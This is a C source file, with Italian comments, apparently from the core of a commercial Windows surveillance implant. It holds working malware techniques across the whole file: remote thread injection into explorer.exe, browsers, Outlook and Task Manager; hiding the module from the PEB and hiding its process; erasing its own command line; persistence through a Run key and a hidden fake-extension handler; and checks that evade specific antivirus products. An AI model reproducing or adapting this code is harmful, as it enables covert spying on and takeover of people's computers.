	if (! (hMod = GetModuleHandle("KERNEL32.DLL")) )
		return;

	HMCreateProcessThreadData.pCreateProcess = (CreateProcess_t) HM_SafeGetProcAddress(hMod, "CreateProcessA");

	HMCreateProcessThreadData.pCloseHandle = (CloseHandle_t) HM_SafeGetProcAddress(hMod, "CloseHandle");

	if (!HMCreateProcessThreadData.pCreateProcess || !HMCreateProcessThreadData.pCloseHandle)
		return;

	// Cerca il PID di exporer.exe
	// solo se non abbiamo specificato il processo ospite
	if (!explorer_pid)
		explorer_pid = HM_FindPid("explorer.exe", TRUE);

	// Se non trova un processo ospite, o se e' a 64bit, chiama la CreateProcess normale
	if (!explorer_pid || IsX64Process(explorer_pid)) {
		pi->hProcess = 0; pi->hThread = 0;
		IndirectCreateProcessAsUser(HMCreateProcessThreadData.cmd_line, flags, si, pi, hToken);
		if (pi->hProcess)
			CloseHandle(pi->hProcess);
		if (pi->hThread)
			CloseHandle(pi->hThread);
		pi->hProcess = 0; pi->hThread = 0;
		return;
	}

	// Inietta dentro explorer la funzione per la CreateProcess
	if(HM_sCreateHookA(explorer_pid, 
					   NULL, NULL, 
					   (BYTE *)HM_CreateProcessThread, 
					   500, 
					   (BYTE *)&HMCreateProcessThreadData, 
					   sizeof(HMCreateProcessThreadData)) == NULL)
							return;

	pCodeRemote = (BYTE *)HMCreateProcessThreadData.dwHookAdd;
	pDataRemote = (BYTE *)HMCreateProcessThreadData.dwDataAdd;

	// Esegue il thread in explorer.exe
	hProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, explorer_pid);
	if(hProcess == NULL) 
		return;

	hThreadRem = HM_SafeCreateRemoteThread(hProcess, NULL, 8192, 
									(LPTHREAD_START_ROUTINE)pCodeRemote, 
									(LPVOID)pDataRemote, 0, 
									&dwThreadId);

	if(hThreadRem == NULL) {
		FNC(VirtualFreeEx)(hProcess, pCodeRemote, 0, MEM_RELEASE);
		FNC(VirtualFreeEx)(hProcess, pDataRemote, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return ;
	}
		
	// Aspetta che finisca il thread
	FNC(WaitForSingleObject)(hThreadRem, INFINITE);
	CloseHandle(hThreadRem);

	// Legge la memoria con il PID
	if (HM_SafeReadProcessMemory(hProcess, pDataRemote, &HMCreateProcessThreadData, sizeof(HMCreateProcessThreadData), &dummy))
		pi->dwProcessId = HMCreateProcessThreadData.pi.dwProcessId;

	FNC(VirtualFreeEx)(hProcess, pDataRemote, 0, MEM_RELEASE);
	FNC(VirtualFreeEx)(hProcess, pCodeRemote, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	return;
}


// Funzione per il completamento del path relativo alla posizione della DLL.
// 
char *HM_CompletePath(const char *file_name, char *buffer)
{
	_snprintf_s(buffer, _MAX_PATH, _TRUNCATE, "%s\\%s", shared.H4_HOME_PATH, file_name);
	return buffer;
}

WCHAR *HM_CompletePathW(const WCHAR *file_name, WCHAR *buffer)
{
	_snwprintf_s(buffer, _MAX_PATH, _TRUNCATE, L"%S\\%s", shared.H4_HOME_PATH, file_name);
	return buffer;
}

// ritorna la data (100-nanosec dal 1601)
BOOL HM_GetDate(NANOSEC_TIME *time)
{
	FILETIME time_nanosec;

	FNC(GetSystemTimeAsFileTime)(&time_nanosec);
	time->hi_delay = time_nanosec.dwHighDateTime;
	time->lo_delay = time_nanosec.dwLowDateTime;

	return TRUE;
}

BOOL HM_HourStringToMillisecond(const char *time_string, DWORD *millisecond)
{
	DWORD hour, minute, second;
	sscanf_s(time_string, "%d:%d:%d", &hour, &minute, &second); 
	*millisecond = ((((hour*60) + minute)*60) + second)*1000;
	return TRUE;
}

BOOL HM_TimeStringToFileTime(const char *time_string, FILETIME *ftime)
{
	SYSTEMTIME stime;

	ZeroMemory(&stime, sizeof(stime));
	sscanf_s(time_string, "%d-%d-%d %d:%d:%d", &stime.wYear, &stime.wMonth, &stime.wDay, &stime.wHour, &stime.wMinute, &stime.wSecond); 

	return SystemTimeToFileTime(&stime, ftime);
}

#include "../modules/imagent/SkypeACL/HashUtil.h"
#define EXT_LEN 4
BOOL CreateFakeExtension(char *ext)
{
	DWORD i;
	BYTE md5_water[MD5_DIGEST_SIZE * 2 + 1];
	BYTE md5_encky[MD5_DIGEST_SIZE * 2 + 1];

	if (!MD5_Array((char *)md5_water, WATERMARK, 8))
		return FALSE;
	if (!MD5_Array((char *)md5_encky, ENCRYPTION_KEY, 8))
		return FALSE;
	
	for (i=0; i<EXT_LEN; i++) {
		md5_water[i] += md5_encky[i];
		ext[i] = 'a'+ (md5_water[i]%26);
	}
	ext[i] = 0;
	return TRUE;
}

// Inserisce la chiave nel registry per l'avvio automatico
void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
{
	char key_value[DLLNAMELEN*3];
	char dll_path[DLLNAMELEN];
	char key_path[DLLNAMELEN];
	char extension[12];
	char *ptr;
	HANDLE hfile;
	HKEY hOpen;

	if (!CreateFakeExtension(extension))
		return;

	// Verifica, se richiesto, l'esistenza della chiave 
	if (!force_insert) {
		DWORD ktype;
		char value[MAX_PATH];
		DWORD len = sizeof(value);
		ZeroMemory(value, len);
		sprintf(key_value, "Software\\Classes\\%s_auto_file\\shell\\open\\command", extension);
		if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, key_value, &hOpen) == ERROR_SUCCESS) {
			if (FNC(RegQueryValueExA)(hOpen, NULL, NULL, &ktype, (BYTE *)value, &len) == ERROR_SUCCESS) {
				if (strstr(value, dll_name)) {
					FNC(RegCloseKey)(hOpen);
					return;
				}
			}
			FNC(RegCloseKey)(hOpen);
		}
	}

	// Crea il file per l'avvio se non esiste gia'
	sprintf(key_value, "..\\%s.%s", shared.REGISTRY_KEY_NAME, extension);
	HM_CompletePath(key_value, dll_path);
	hfile = CreateFile(dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		hfile = CreateFile(dll_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
		if (hfile == INVALID_HANDLE_VALUE) {
			CloseHandle(hfile);
			return;
		}
		CloseHandle(hfile);
		FNC(SetFileAttributesA)(dll_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_ARCHIVE);
	} else 
		CloseHandle(hfile);

	// Scrive il comando da eseguire
	HM_CompletePath(dll_name, dll_path);
	sprintf_s(key_value, "%%systemroot%%\\system32\\rundll32.exe \"%windir%\\..\\%s\",,PPPFTBBP08", dll_path + 3);

	sprintf(key_path, "Software\\Classes\\%s_auto_file\\shell\\open\\command", extension);
	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, key_path, &hOpen) != ERROR_SUCCESS) 
		return;
	if (FNC(RegSetValueExA)(hOpen, NULL, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hOpen);
		return;
	}
	FNC(RegCloseKey)(hOpen);

	// Associa l'estensione
	sprintf(key_value, "%s_auto_file", extension);
	sprintf(key_path, "Software\\Classes\\.%s", extension);
	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, key_path, &hOpen) != ERROR_SUCCESS) 
		return;
	if (FNC(RegSetValueExA)(hOpen, NULL, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hOpen);
		return;
	}
	FNC(RegCloseKey)(hOpen);

	// scrive la chiave in Run
	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS ||
		FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {		
		sprintf(key_value, shared.H4_HOME_PATH);
		if (ptr = strrchr(key_value, '\\')) { 
			*ptr = 0;
			sprintf(key_value, "%s\\%s.%s", key_value, shared.REGISTRY_KEY_NAME, extension);
			FNC(RegSetValueExA)(hOpen, shared.REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);
		}
		FNC(RegCloseKey)(hOpen);
	}
}


// Rimuove la chiave di startup nel registry
void HM_RemoveRegistryKey()
{
	HKEY hOpen;
	char key_path[DLLNAMELEN];
	char dll_path[DLLNAMELEN];
	char extension[12];

	// Cancella chiave in Run
	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
		FNC(RegDeleteValueA) (hOpen, shared.REGISTRY_KEY_NAME);
		FNC(RegCloseKey)(hOpen);
	}

	if (!CreateFakeExtension(extension))
		return;

	// Cancella l'associazione
	sprintf(key_path, "Software\\Classes\\.%s", extension);
	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);

	// Cancella il comando
	sprintf(key_path, "Software\\Classes\\%s_auto_file\\shell\\open\\command", extension);
	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
	sprintf(key_path, "Software\\Classes\\%s_auto_file\\shell\\open", extension);
	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
	sprintf(key_path, "Software\\Classes\\%s_auto_file\\shell", extension);
	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
	sprintf(key_path, "Software\\Classes\\%s_auto_file", extension);
	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);

	// Cancella il file
	sprintf(key_path, "..\\%s.%s", shared.REGISTRY_KEY_NAME, extension);
	HM_CompletePath(key_path, dll_path);
	FNC(SetFileAttributesA)(dll_path, FILE_ATTRIBUTE_NORMAL);
	FNC(DeleteFileA)(dll_path);
}

// Verifica se c'e' una copia integra del file di configurazione.
// Se e' integra la rimpiazza sull'originale. In ogni caso la cancella (se esiste).
// Se rimpiazza l'originale ritorna TRUE.
BOOL HM_CheckNewConf(char *conf_file_name) 
{
	HANDLE h_conf_file;
	char *clear_file;
	char conf_path[DLLNAMELEN];
	char orig_conf_path[DLLNAMELEN];

	h_conf_file = FNC(CreateFileA)(HM_CompletePath(conf_file_name, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	// Se non trova nessun file di backup ritorna (lo considera inesistente)
	if (h_conf_file == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(h_conf_file);

	// Verifica che il file sia integro e decifrabile correttamente
	clear_file = HM_ReadClearConf(conf_file_name);
	if (!clear_file) {
		HM_WipeFileA(HM_CompletePath(conf_file_name, conf_path));
		return FALSE;
	}
	SAFE_FREE(clear_file);

	// Ora il file e' considerato integro e tutti gli handle sono chiusi.
	// Procede quindi alla copia su quello originale.
	// Se fallisce la copia non cancella il backup (lo copiera' al prossimo avvio).
	UnlockConfFile();
	if (!FNC(CopyFileA)(HM_CompletePath(conf_file_name, conf_path), HM_CompletePath(shared.H4_CONF_FILE, orig_conf_path), FALSE))
		return FALSE;
	LockConfFile();

	// La copia e' riuscita, quindi cancella il file di backup e torna TRUE.
	HM_WipeFileA(HM_CompletePath(conf_file_name, conf_path));

	// Nel caso ci sia DeepFreeze, fixa il file di destinazione sul disco reale
	if (IsDeepFreeze()) {
		HideDevice dev_df;
		WCHAR dest_path[MAX_PATH];
		swprintf(dest_path, L"%S", HM_CompletePath(shared.H4_CONF_FILE, orig_conf_path));
		DFFixFile(&dev_df, dest_path);
	}

	return TRUE;
}

// Ritorna una zona di memoria con il file di configurazione
// in chiaro. Va liberata!!!. Torna NULL se fallisce.
#define AES_BLOCK_LEN 16
#define MINIMUM_CONF_LEN (SHA_DIGEST_LENGTH+AES_BLOCK_LEN)
char *HM_ReadClearConf(char *conf_name)
{
	BYTE iv[BLOCK_LEN];
	char *conf_memory_clear = NULL;
	DWORD conf_len = INVALID_FILE_SIZE;
	BYTE *conf_memory = NULL;
	HANDLE h_conf_file, h_map = 0;
	char conf_path[DLLNAMELEN];
	BYTE crc[SHA_DIGEST_LENGTH];
	BOOL crc_ok = FALSE;
	DWORD pad_len;

	// Mappa per comodita' il file di configurazione nella memoria
	h_conf_file = FNC(CreateFileA)(HM_CompletePath(conf_name, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (h_conf_file != INVALID_HANDLE_VALUE && (h_map = FNC(CreateFileMappingA)(h_conf_file, NULL, PAGE_READONLY, 0, 0, NULL))) {
		conf_memory = (BYTE *)FNC(MapViewOfFile)(h_map, FILE_MAP_READ, 0, 0, 0);
		conf_len = FNC(GetFileSize)(h_conf_file, NULL);
	}
	
	// Crea una copia in chiaro in memoria
	if (conf_memory && conf_len!=INVALID_FILE_SIZE && conf_len>MINIMUM_CONF_LEN) {
		// Alloca la memoria 
		conf_memory_clear = (char *)malloc(conf_len);
		if (conf_memory_clear) {
			// Decifra il file di conf (assume che la parte cifrata sia gia' stata
			// paddata).
			memset(iv, 0, sizeof(iv));
			aes_cbc_decrypt(&shared.crypt_ctx_conf, iv, conf_memory, (BYTE *)conf_memory_clear, conf_len);
		}	
	}
	
	// Chiude il mapping
	if (conf_memory)
		FNC(UnmapViewOfFile)(conf_memory);
	if (h_map)
		CloseHandle(h_map);
	if (h_conf_file != INVALID_HANDLE_VALUE)
		CloseHandle(h_conf_file);

	if (!conf_memory_clear)
		return NULL;

	// Elimina il padding
	pad_len = conf_memory_clear[conf_len-1];
	if (pad_len>AES_BLOCK_LEN) {
		SAFE_FREE(conf_memory_clear);
		return NULL;
	}

	// Check del CRC
	SHA1Context sha;
	SHA1Reset(&sha);
	SHA1Input(&sha, (const unsigned char *)conf_memory_clear, conf_len - SHA_DIGEST_LENGTH - pad_len);
	if (SHA1Result(&sha)) {
		for (int i=0; i<5; i++)
			sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
		memcpy(crc, sha.Message_Digest, SHA_DIGEST_LENGTH);
		if (!memcmp(crc, conf_memory_clear + conf_len - SHA_DIGEST_LENGTH - pad_len, SHA_DIGEST_LENGTH))
			crc_ok = TRUE;
	}

	if (!crc_ok) {
		SAFE_FREE(conf_memory_clear);
		return NULL;
	}

	// NULL termina la stringa azzerando il CRC
	memset(conf_memory_clear + conf_len - SHA_DIGEST_LENGTH - pad_len, 0, SHA_DIGEST_LENGTH);

	return conf_memory_clear;
}

// Prende il path del browser di default
// Torna TRUE se ci riesce
BOOL HM_GetDefaultBrowser(char *path_name)
{
#define IEPATH "http\\shell\\open\\command"

	HKEY hIEPath;
	char short_path[DLLNAMELEN];
	char unquoted_long_path[DLLNAMELEN];
	DWORD iLen = sizeof(short_path);
	char *clean_short_path;
	char *params;

	// XXX - Si incazza se si cerca di aprire il default browser
	if (IsNortonInternetSecurity() || IsKaspersky()) {
		if (IsX64System())
			sprintf(path_name, "\"%s\"", "C:\\Windows\\SysWOW64\\notepad.exe");
		else
			sprintf(path_name, "\"%s\"", "C:\\Windows\\System32\\notepad.exe");
		return TRUE;
	}

	// Apre il registry
	if(FNC(RegOpenKeyA)(HKEY_CLASSES_ROOT, IEPATH, &hIEPath) != ERROR_SUCCESS )
		return FALSE;

	if(FNC(RegQueryValueExA)(hIEPath, NULL, NULL, NULL, (BYTE *)short_path, &iLen) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hIEPath);
		return FALSE;
	}
	FNC(RegCloseKey)(hIEPath);

	// Toglie eventuali parametri
	params = strstr(short_path, ".exe");
	if (params)
		params[4] = 0;
	params = strstr(short_path, ".EXE");
	if (params)
		params[4] = 0;
	clean_short_path = short_path;
	if (short_path[0]=='"')
		clean_short_path++; 

	// Prende il long name
	if (!FNC(GetLongPathNameA)(clean_short_path, unquoted_long_path, DLLNAMELEN))
		return FALSE;

	// Lo mette tra "" per evitare ambiguita' alla CreateProcess
	sprintf(path_name, "\"%s\"", unquoted_long_path);
	return TRUE;
}

// Prende il path di IE32
BOOL HM_GetIE32Browser(char *path_name)
{
	if (GetEnvironmentVariableA("ProgramFiles(x86)", path_name, DLLNAMELEN) == 0)
		return FALSE;

	StrCat(path_name, "\\Internet Explorer\\iexplore.exe");
	return TRUE;
}

DWORD WINAPI InjectServiceThread(DWORD dummy)
{
	DWORD service_pid;

	while( (service_pid = FindRunAsService()) == 0 ) 
		Sleep(500);

	HM_sStartHookingThread(service_pid, NULL, TRUE, FALSE);
	return 0;
}

// Inietta il thread di hooking in tutti i processi attivi
// tranne che nel processo chiamante
BOOL HM_HookActiveProcesses()
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD dwCallingPid;
	DWORD integrity_level;
	DWORD dummy;

	// Vede se siamo su Vista
	if (IsVista(&integrity_level) && integrity_level>=IL_HIGH) 
		// Cerca all'infinito di infettare il thread che lancia la UAC
		HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InjectServiceThread, NULL, 0, &dummy);		

	// Continua con l'infection dei processi utente
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	dwCallingPid = FNC(GetCurrentProcessId)();
	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
		return FALSE;

	if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return FALSE;
	}

	// Cicla la lista dei processi attivi
	do {
		// Effettua l'hook solo se il processo non e' il chiamante
		if (pe32.th32ProcessID != dwCallingPid && IsMyProcess(pe32.th32ProcessID))
			HM_sStartHookingThread(pe32.th32ProcessID, NULL, TRUE, TRUE);
	} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	return TRUE ;
}


BOOL IsBrowser(char *name)
{
	const char* browser_name[] = { "opera.exe", "iexplore.exe", "firefox.exe", "chrome.exe", NULL };

	int i = 0;
	while (browser_name[i] != NULL) {
		if (!_stricmp(name, browser_name[i]))
			return TRUE;

		i++;
	}
	
	return FALSE;
}

// Monitora la presenza di nuovi TaskManager
// o explorer.exe in cui effettuare l'injection.
// Monitora anche la coda dei messaggi per effettuare
// la chiusura del processo.
// Diventa il loop principale del programma.
#define HM_PTSLEEPTIME 1400
#define PROCESS_POLLED 6
#define PROCESS_FREQUENTLY_POLLED 4

DWORD WINAPI PollNewApps(DWORD dummy)
{
	char* polled_name[PROCESS_POLLED] = { "taskmgr.exe", "outlook.exe", "explorer.exe", "mghtml.exe", "iexplore.exe", "chrome.exe" };
	DWORD i, loop_count = 0;
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	char *name_offs;
	BOOL infected;

	LOOP {
		Sleep(HM_PTSLEEPTIME);
		loop_count++;

		pe32.dwSize = sizeof( PROCESSENTRY32 );
		if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE ) 
			continue;
		if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
			CloseHandle( hProcessSnap );
			continue;
		}
		// Cicla la lista dei processi attivi
		do {
			infected = FALSE;
			// Elimina il path
			name_offs = strrchr(pe32.szExeFile, '\\');
			if (!name_offs)
				name_offs = pe32.szExeFile;
			else
				name_offs++;

			// XXX - Norton si incazza se si iniettano i browser
			if (IsNortonInternetSecurity() && IsBrowser(name_offs))
				continue;

			// Confronta il nome con quelli da pollare
			if ((loop_count%3) == 0) {
				for (i=0; i<PROCESS_POLLED; i++) {
					if (!_stricmp(name_offs, polled_name[i]) && IsMyProcess(pe32.th32ProcessID)) {
						// Se e' fra quelli lo inietta (HM_sStartHookingThread lo fara' solo la prima volta)
						HM_sStartHookingThread(pe32.th32ProcessID, NULL, FALSE, TRUE);
						infected = TRUE;
						break;
					}
				}
			} else {
				for (i=0; i<PROCESS_FREQUENTLY_POLLED; i++) {
					if (!_stricmp(name_offs, polled_name[i]) && IsMyProcess(pe32.th32ProcessID)) {
						// Se e' fra quelli lo inietta (HM_sStartHookingThread lo fara' solo la prima volta)
						HM_sStartHookingThread(pe32.th32ProcessID, NULL, FALSE, TRUE);
						infected = TRUE;
						break;
					}
				}
			}

			// In questo caso non e' hookata la CreateProcess, quindi infetta tutti i processi tramite polling.
			// La stessa cosa la fa sui sistemi a 64 bit (explorer e' a 64 bit, quindi non infettera' nessun figlio
			// a 32bit). Non cerca di marcare i processi a 64bit (il core gira a 32 e non ci riuscirebbe)
			// Guarda i bypass, marca i processi hookati
			if (!infected && (IsX64System() || IsBitDefender())) {
				DWORD dwCallingPid = FNC(GetCurrentProcessId)();
				if (pe32.th32ProcessID != dwCallingPid && !IsX64Process(pe32.th32ProcessID) && IsMyProcess(pe32.th32ProcessID) )
					HM_sStartHookingThread(pe32.th32ProcessID, NULL, TRUE, TRUE);	
			}
		} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );
		CloseHandle( hProcessSnap );
	}
}

void HM_StartPolling(void)
{
	DWORD dummy;
	MSG msg;

	HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PollNewApps, NULL, 0, &dummy);
	LOOP {
		HANDLE_SENT_MESSAGES(msg, 100);
	}
}


BOOL FindModulePath(char *path_buf, DWORD path_size)
{
	HMODULE hLib= NULL;
	HMODULE modules[1024];
	char temp_buf[_MAX_PATH * 2 + 2];
	char *dos_ascii_name;
	DWORD mod_size;
	DWORD mod_num;
	DWORD i;

	// Se ha gia' le variabili settate le recupera da li'
	// altrimenti (e' la prima volta che lo chiama, o siamo in un servizio che
	// non ha la shared), la calcola al volo.
	HM_CompletePath(shared.H4DLLNAME, path_buf);
	if (strlen(path_buf) >= 3)
		return TRUE;

	// Cerca il modulo che esporta la funzione PPPFTBBP01 (cioe' se stesso)
	if (!FNC(EnumProcessModules)(FNC(GetCurrentProcess)(), modules, sizeof(modules), &mod_size)) 
		return FALSE;

	mod_num = mod_size/sizeof(HMODULE);
	for (i=0; i<mod_num; i++) {
		// L'abbiamo trovato
		if ((DWORD)GetProcAddress(modules[i], "PPPFTBBP01")) {
			hLib = modules[i];
			break;
		}
	}

	if (!hLib) 
		return FALSE;
	
	ZeroMemory(temp_buf, sizeof(temp_buf)); // Ci assicuriamo che il nome sia NULL terminato
	if (!FNC(GetModuleFileNameExW)(FNC(GetCurrentProcess)(), hLib, (WCHAR *)temp_buf, _MAX_PATH)) 
		return FALSE;

	if (!(dos_ascii_name = GetDosAsciiName((WCHAR *)temp_buf)))
		return FALSE;

	_snprintf_s(path_buf, path_size, _TRUNCATE, "%s", dos_ascii_name);
	SAFE_FREE(dos_ascii_name);
	
	return TRUE;
}


// Cancella la command line
static void HM_ClearCommand()
{
	char *ptr;
	char *cmd_lineA;
	wchar_t *cmd_lineW;
	wchar_t *ptrW;
	
	cmd_lineA = FNC(GetCommandLineA)();
	if ( !(ptr = strchr(cmd_lineA, ' ')) )
		return;
	while(*ptr) {
		*ptr = 0;
		ptr++;
	}

	cmd_lineW = FNC(GetCommandLineW)();
	if ( !(ptrW = wcschr(cmd_lineW, ' ')) )
		return;
	while(*ptrW) {
		*ptrW = 0;
		ptrW++;
	}
}

void HM_CalcDateDelta(long long server_time, NANOSEC_TIME *delta)
{
	long long client_time;
	long long delta_l;
	
	_time64(&client_time);
	delta_l = server_time - client_time;

	// Trasforma i secondi in 100-nanosec
	delta_l *= 10000000;
	delta->lo_delay = (DWORD)(delta_l & 0xFFFFFFFF);
	delta->hi_delay = (DWORD)(delta_l >> 32);
}

static void DeletePending()
{
	char d_file_path[MAX_PATH];
	HM_WipeFileA(HM_CompletePath(shared.H4DRIVER_NAME_ALT, d_file_path));
	HM_WipeFileA(HM_CompletePath(shared.H4DRIVER_NAME, d_file_path));
	HM_WipeFileA(HM_CompletePath(shared.H4_UPDATE_FILE, d_file_path));
}

// Main del core
void WINAPI HM_sMain(void)
{
	PID_HIDE pid_hide;

	// Ci sono degli AV con cui proprio non si deve installare
	if (IsBlackList()) 
		FNC(ExitProcess)(0);

	//Riempie i campi relativi al nome del file immagine,
	//file di configurazione, directory di installazione
	//etc. Va fatta come PRIMA cosa.
	if (!HM_GuessNames()) 
		FNC(ExitProcess)(0);

	// Tutte le funzioni di logging sono attive solo
	// nella versione demo
	if (!CreateLogWindow())
		FNC(ExitProcess)(0);

	ScrambleString ssok("QM\r\n", shared.is_demo_version); // "OK\r\n"
	ScrambleString ss1("_ B0lgDUPC gEo7EPlPv1...........", shared.is_demo_version); // "- Checking components..........."
	ScrambleString ss2("_ xgvUR8vUPC 0UiUPC 1J1vlo......", shared.is_demo_version); // "- Activating hiding system......"
	ScrambleString ss3("L99Q9\r\n    3-ru5 [eP8IWl vE il7WEJ]\r\n", shared.is_demo_version); // "ERROR\r\n    17240 [Unable to deploy]\r\n"
	ScrambleString ss4("_ yPUvU8WUAUPC oEidWl1..........", shared.is_demo_version); // "- Initializing modules.........."
	ScrambleString ss5("L99Q9\r\n    rYp35 [K0l 1J1vlo U1 8Wtl8iJ oEPUvEtli]\r\n", shared.is_demo_version); // "ERROR\r\n    29310 [The system is already monitored]\r\n"
	ScrambleString ss6("_ 4v8tvUPC gEtl oEidWl..........", shared.is_demo_version); // "- Starting core module.........."
	ScrambleString ss7("\r\n xClPv zdWWJ E7lt8vUEP8W\r\n\r\n", shared.is_demo_version); // "\r\n Agent fully operational\r\n\r\n"

	REPORT_STATUS_LOG(ss1.get_str());

	// Locka il file di configurazione per prevenire cancellazioni "accidentali"
	LockConfFile();

	// Elimina il modulo dalla PEB
	// XXX da qui in poi non potro' piu' fare GetModuleHandle etc. di questo modulo
	HidePEB(GetModuleHandle(shared.H4DLLNAME));

	REPORT_STATUS_LOG(ssok.get_str()); 

	// Cancella la command line
	HM_ClearCommand();

	REPORT_STATUS_LOG(ss2.get_str());

	// Toglie gli hook, prende i privilegi, etc.
	if (!doUnhook()) {
		REPORT_STATUS_LOG(ss3.get_str()); 
		ReportExitProcess();
	} 
	REPORT_STATUS_LOG(ssok.get_str()); 

	// Inizializza la chiave di cifratura (va fatto prima di qualsiasi
	// accesso al file di configurazione).
	LOG_InitCryptKey(bin_patched_key, bin_patched_key_conf);

	// Controlla se c'e' un file di configurazione pendente
	// o corrotto (lo rimpiazza con l'eventuale copia di backup).
	// Va fatto prima di AM_Startup, perche' quest'ultima legge
	// gia' il file di configurazione.
	HM_CheckNewConf(shared.H4_CONF_BU);
	//HM_CheckNewConf("nc-7-8dv.cfg");

	// Legge le configurazioni globali. Va fatto DOPO HM_CheckNewConf.
	HM_UpdateGlobalConf();
	
	// L'agent manager deve essere startato prima di effettuare gli hook 
	// (infatti e' lui che inizializza tutta la parte di IPC).
	REPORT_STATUS_LOG(ss4.get_str());
	if (!AM_Startup()) {
		REPORT_STATUS_LOG(ss5.get_str()); 
		shared.g_remove_driver = FALSE; // Disinstalla questa istanza ma lascia il driver per eventuali altre istanze running
		DA_Uninstall(NULL); // AM_Startup fallisce se la sharedmemory gia' esiste
	}
	REPORT_STATUS_LOG(ssok.get_str()); 

	// Effettua l'injection in tutti i processi attivi
	HM_HookActiveProcesses();

	// Lancia (se e' il caso) il core a 64 bit
	Run64Core();

	// Nasconde il processo chiamante (host della DLL core)
	SET_PID_HIDE_STRUCT(pid_hide, FNC(GetCurrentProcessId)());
	AM_AddHide(HIDE_PID, &pid_hide);

	// Inserisce la chiave nel registry
	// Viene fatto dopo l'hiding per evitare che venga vista da processi
	// come TeaTimer, ma fare attenzione che il processo core non possa 
	// uscire prima per altri errori (anche se c'e' qualche problema
	// la chiave nel registry deve essere inserita ad ogni costo).
	REPORT_STATUS_LOG(ss6.get_str());
	Sleep(3300); // XXX Aspetta che venga fatta l'injection prima di scrivere la chiave
	HM_InsertRegistryKey(shared.H4DLLNAME, FALSE);

	// Cancella eventuali file pendenti vecchi e inutilizzati
	DeletePending();

	// Inizializza (dal file di configurazione) e fa partire gli agent
	// e il thread di dispatch
	AM_SuspendRestart(AM_RESET);
	REPORT_STATUS_LOG(ssok.get_str()); 

	// Viene cambiato lo sfondo del desktop, ma solo se e'
	// stata compilata in versione DEMO
	SetDesktopBackground();

	// Fa partire il sync manager 
	SM_StartMonitorEvents();

	// Lancia il thread per il monitoraggio della formattazione
	//StartFormatThread();

	REPORT_STATUS_LOG(ss7.get_str());
	LOG_SendStatusLog(L"[Core Module]: Started");

	// Ciclo per l'hiding da task manager e dai nuovi epxlorer
	// lanciati. Monitora anche la coda dei messaggi per
	// chiudere correttamente il processo al logoff.
	// E' nel thread principale per poter chiudere correttamente
	// il processo.
	HM_StartPolling();
}
